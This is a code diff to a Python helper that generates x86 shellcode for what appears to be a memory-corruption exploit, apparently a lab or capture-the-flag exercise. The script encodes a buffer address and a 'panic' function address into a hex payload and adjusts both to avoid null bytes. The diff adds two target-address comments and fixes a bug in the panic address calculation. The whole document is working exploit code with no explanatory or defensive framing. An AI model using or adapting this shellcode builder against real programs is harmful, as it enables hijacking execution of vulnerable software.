@@ -1,5 +1,8 @@
 shellcode = 'B8{}B9{}29C883C03250B8{}B9{}29C8FFD090909090'
 
+#00041f44
+#00006096
+
 def get_shellcode(buf_addr, panic_addr):
     buf_base = int.from_bytes(bytes.fromhex(buf_addr), "big") + 0x01010101
     buf_low = 0x01010101
@@ -9,7 +12,7 @@ def get_shellcode(buf_addr, panic_addr):
         buf_base += 1
         buf_low += 1
 
-    panic_base = int.from_bytes(bytes.fromhex(buf_addr), "big") + 0x01010101
+    panic_base = int.from_bytes(bytes.fromhex(panic_addr), "big") + 0x01010101
     panic_low = 0x01010101
     while('00' in panic_base.to_bytes(4, 'little').hex() or
           '00' in panic_low.to_bytes(4, 'little').hex()):
